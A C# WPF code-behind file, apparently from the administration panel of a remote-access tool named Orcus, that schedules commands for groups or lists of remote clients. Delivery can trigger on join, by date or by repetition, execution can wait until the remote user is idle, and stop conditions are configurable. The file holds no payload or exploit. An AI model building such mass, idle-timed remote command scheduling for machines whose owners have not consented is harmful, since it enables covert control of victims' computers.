using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using Orcus.Administration.Core.ClientManagement;
using Orcus.Administration.ViewModels;
using Orcus.Plugins.PropertyGrid;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.ExecutionEvents;
using Orcus.Shared.DynamicCommands.StopEvents;
using Orcus.Shared.DynamicCommands.TransmissionEvents;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.Views
{
    /// <summary>
    ///     Interaction logic for CrowdControlCreateTaskWindow.xaml
    /// </summary>
    public partial class CrowdControlCreateTaskWindow
    {
        public CrowdControlCreateTaskWindow()
        {
            InitializeComponent();

            DateAndTimePicker.Value = DateTime.Now.AddMinutes(15);
            DateAndTimePicker.Minimum = DateTime.Now;

            DateAndTimeExecutionPicker.Value = DateTime.Now.AddMinutes(15);
            DateAndTimeExecutionPicker.Minimum = DateTime.Now;

            IdleDateAndTimeExecutionPicker.Value = DateTime.Now.AddDays(1);
            IdleDateAndTimeExecutionPicker.Minimum = DateTime.Now;

            RepeatingDateTimePicker.Value = DateTime.Now;
            RepeatingTimeSpanUpDown.Value = TimeSpan.FromDays(1);

            StopEventDateAndTimePicker.Value = DateTime.Now.AddMinutes(15);
            DurationStopTimeSpanUpDown.Value = TimeSpan.FromHours(1);

            //DataContextChanged += OnDataContextChanged;
        }

        private void OnDataContextChanged(object sender,
            DependencyPropertyChangedEventArgs dependencyPropertyChangedEventArgs)
        {
            var viewModel = dependencyPropertyChangedEventArgs.NewValue as CrowdControlCreateTaskViewModel;
            if (viewModel != null)
            {
                viewModel.SelectClientViewModels = SelectClientViewModels;
                viewModel.Loaded();
            }
        }

        private void SelectClientViewModels(List<ClientViewModel> clientViewModels)
        {
            ClientsRadioButton.IsChecked = true;

            var clients = clientViewModels.ToList();
            foreach (var clientViewModel in clients)
                ClientsListView.SelectedItems.Add(clientViewModel);

            if (clients.Count > 0)
                ClientsListView.ScrollIntoView(clients[0]);
        }

        // I know that this void is breaking the MVVM pattern (a little bit), but I don't think that putting this code in the view model would be a good and reasonable idea because that would require a lot of extra code because all these properties must be accessed somehow. IMO this is the best solution, else I would have written a custom control with this logic
        private void OkButton_OnClick(object sender, RoutedEventArgs e)
        {
            var crowdControlCreateTaskViewModel = (CrowdControlCreateTaskViewModel) DataContext;
            if (crowdControlCreateTaskViewModel.SelectedCommand == null)
                return;

            CommandTarget commandTarget;
            if (GroupsRadioButton.IsChecked == true)
                commandTarget = CommandTarget.FromGroups(GroupsListBox.SelectedItems.Cast<string>());
            else if (ClientsRadioButton.IsChecked == true)
                commandTarget =
                    CommandTarget.FromClients(
                        ClientsListView.SelectedItems.Cast<ClientViewModel>().Select(x => x.Id).ToList());
            else
                commandTarget = null;

            TransmissionEvent transmissionEvent;
            if (ImmediatelyEventRadioButton.IsChecked == true)
                transmissionEvent = new ImmediatelyTransmissionEvent();
            else if (DateTimeEventRadioButton.IsChecked == true)
            {
                if (!DateAndTimePicker.Value.HasValue || DateTime.Now > DateAndTimePicker.Value)
                {
                    MessageBoxEx.Show(this, (string) Application.Current.Resources["TimeIsInPast"],
                        (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                        MessageBoxImage.Error);
                    return;
                }
                transmissionEvent = new DateTimeTransmissionEvent
                {
                    DateTime = DateAndTimePicker.Value.Value.ToUniversalTime()
                };
            }
            else if (OnJoinEventRadioButton.IsChecked == true)
                transmissionEvent = new OnJoinTransmissionEvent();
            else if (EveryClientOnceRadioButton.IsChecked == true)
                transmissionEvent = new EveryClientOnceTransmissionEvent();
            else if (RepeatingEventRadioButton.IsChecked == true)
            {
                if (!RepeatingDateTimePicker.Value.HasValue || !RepeatingTimeSpanUpDown.Value.HasValue)
                    return;

                if (RepeatingTimeSpanUpDown.Value.Value <= TimeSpan.Zero)
                {
                    MessageBoxEx.Show(this, (string) Application.Current.Resources["ErrorTimeSpanCantBeSmallerThanZero"],
                        (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                        MessageBoxImage.Error);
                    return;
                }

                transmissionEvent = new RepeatingTransmissionEvent
                {
                    DayZero = RepeatingDateTimePicker.Value.Value.ToUniversalTime(),
                    TimeSpan = RepeatingTimeSpanUpDown.Value.Value
                };
            }
            else
                return;

            IExecutionEventBuilder executionEventBuilder;
            if (ImmediatelyExecutionRadioButton.IsChecked == true)
                executionEventBuilder = null;
            else if (DateTimeExecutionRadioButton.IsChecked == true)
            {
                if (!DateAndTimeExecutionPicker.Value.HasValue || DateTime.Now > DateAndTimeExecutionPicker.Value.Value)
                {
                    MessageBoxEx.Show(this, (string) Application.Current.Resources["TimeIsInPast"],
                        (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                        MessageBoxImage.Error);
                    return;
                }

                var dateTimeExecutionEventBuilder = new DateTimeExecutionEventBuilder
                {
                    DateTime = DateAndTimeExecutionPicker.Value.Value.ToUniversalTime(),
                    DontExecuteWithDelay = DateAndTimeExecutionCheckBox.IsChecked == true
                };

                executionEventBuilder = dateTimeExecutionEventBuilder;
            }
            else if (IdleExecutionRadioButton.IsChecked == true)
            {
                if (IdleDateAndTimeExecutionCheckBox.IsChecked == true &&
                    (!IdleDateAndTimeExecutionPicker.Value.HasValue ||
                     DateTime.Now > IdleDateAndTimeExecutionPicker.Value.Value))
                {
                    MessageBoxEx.Show(this, (string) Application.Current.Resources["TimeIsInPast"],
                        (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                        MessageBoxImage.Error);
                    return;
                }

                if (!IdleTimeNumericUpDown.Value.HasValue)
                    return;

                var idleExecutionEventBuilder = new IdleExecutionEventBuilder
                {
                    RequiredIdleTime = (int) IdleTimeNumericUpDown.Value,
                    ExecuteAtDateTimeIfItWasntExecuted = IdleDateAndTimeExecutionCheckBox.IsChecked == true,
                    ExecutionDateTime =
                        IdleDateAndTimeExecutionCheckBox.IsChecked == true
                            ? IdleDateAndTimeExecutionPicker.Value.Value.ToUniversalTime()
                            : DateTime.MinValue
                };

                executionEventBuilder = idleExecutionEventBuilder;
            }
            else
                return;

            IStopEventBuilder stopEventBuilder = null;
            if (crowdControlCreateTaskViewModel.IsSelectedCommandTypeActive)
            {
                if (SystemShutdownStopEventRadioButton.IsChecked == true)
                {
                    stopEventBuilder = new ShutdownStopEventBuilder();
                }
                else if (NeverStopEventRadioButton.IsChecked == true)
                {
                    stopEventBuilder = null;
                }
                else if (DurationEventRadioButton.IsChecked == true)
                {
                    var duration = DurationStopTimeSpanUpDown.Value;
                    if (duration == null || duration < TimeSpan.FromSeconds(1))
                    {
                        MessageBoxEx.Show(this,
                            (string) Application.Current.Resources["DurationMustBeGreaterThan1Second"],

                            (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                            MessageBoxImage.Error);
                        return;
                    }

                    stopEventBuilder = new DurationStopEventBuilder {Duration = duration.Value};
                }
                else if (DateTimeStopEventRadioButton.IsChecked == true)
                {
                    if (!StopEventDateAndTimePicker.Value.HasValue || DateTime.Now > StopEventDateAndTimePicker.Value.Value)
                    {
                        MessageBoxEx.Show(this, (string) Application.Current.Resources["TimeIsInPast"],
                            (string) Application.Current.Resources["Error"], MessageBoxButton.OK,
                            MessageBoxImage.Error);
                        return;
                    }

                    stopEventBuilder = new DateTimeStopEventBuilder
                    {
                        DateTime = StopEventDateAndTimePicker.Value.Value.ToUniversalTime()
                    };
                }
            }

            var validationResult = crowdControlCreateTaskViewModel.SelectedCommand.ValidateInput();
            switch (validationResult.ValidationState)
            {
                case ValidationState.Error:
                    MessageBoxEx.Show(this, validationResult.Message, (string) Application.Current.Resources["Error"],
                        MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                case ValidationState.WarningYesNo:
                    if (MessageBoxEx.Show(this, validationResult.Message,
                        (string) Application.Current.Resources["Warning"],
                        MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes)
                        return;

                    break;
                case ValidationState.Success:
                    break;
                default:
                    return;
            }

            var executionEvent = new ExecutionEvent
            {
                Id = executionEventBuilder?.Id ?? 0,
                Parameter = executionEventBuilder?.GetParameter()
            };

            var stopEvent = new StopEvent {Id = stopEventBuilder?.Id ?? 0, Parameter = stopEventBuilder?.GetParameter()};

            crowdControlCreateTaskViewModel.OkButtonClick(commandTarget, transmissionEvent, executionEvent, stopEvent);
        }
    }
}